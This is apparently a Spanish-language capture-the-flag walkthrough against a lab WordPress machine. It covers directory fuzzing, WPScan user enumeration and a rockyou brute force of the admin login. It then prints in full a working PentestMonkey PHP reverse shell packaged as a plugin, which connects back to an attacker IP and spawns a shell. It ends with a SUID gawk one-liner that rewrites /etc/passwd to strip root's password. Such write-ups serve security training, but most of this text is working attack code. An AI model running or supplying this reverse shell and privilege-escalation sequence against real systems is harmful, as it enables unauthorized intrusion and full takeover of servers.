## Reconocimiento:

Puerto 80 : HTTP

En la web no hay nada interesante, así que aplico fuzzing rápido:

```bash
dirb http://192.168.1.100
```

Encuentro wordpress.

Si ingreso la ruta predeterminada para WordPress tengo un mensaje de error con un dominio:

```bash
escolares.dl
```

Lo agrego al host en mi maquina host y logro acceder a un panel de login de WordPress.

```bash
http://192.168.1.100/wordpress/wp-login.php
```

Así que le aplico un análisis con Wpscan:

```bash
wpscan --url http://192.168.1.100/wordpress/wp-login.php --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Encuentro el user admin y le aplico un ataque de fuerza bruta:

```bash
wpscan —url http://192.168.1.100/wordpress/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt
```

Pass : rockyou

Logro acceder al panel de administración de WordPress, toca enviarnos una conexión reversa ya que no hay SSH. Para eso comprimo una shell y la subo como plugin.

Para la shell uso una de PentesMonkey:

```bash
<?php
/*
Plugin Name: Reverse Shell Plugin
Plugin URI: https://github.com/SkyW4r33x
Description: Plugin RevShell
Version: 1.0
Author: SkyW4r33x
Author URI: https://github.com/SkyW4r33x
License: GPL2
*/
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.1';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

La comprimo:

```bash
zip -r shell.zip shellPluggin.php
```

La subo, me pongo en escucha y la activo.

```bash
http://escolares.dl/wordpress/wp-content/plugins/shell/shellPluggin.php
```

## Escalada

Listo permisos SUID:

```bash
find / -perm -4000 2>/dev/null
# Info:
/usr/bin/gawk
```

Encuentro que con ese binario puedes transformar archivos de texto estructurados en filas y columnas, por lo tanto edito el archivo /etc/passwd ya que el binario tiene privilegios root quitándole la x al usuario root para escalar privilegios:

```bash
/usr/bin/gawk -F 'x' '{print $1 $NF > "/etc/passwd"}' /etc/passwd
```

Me cambio de usuario:

```bash
su
```

Listo.
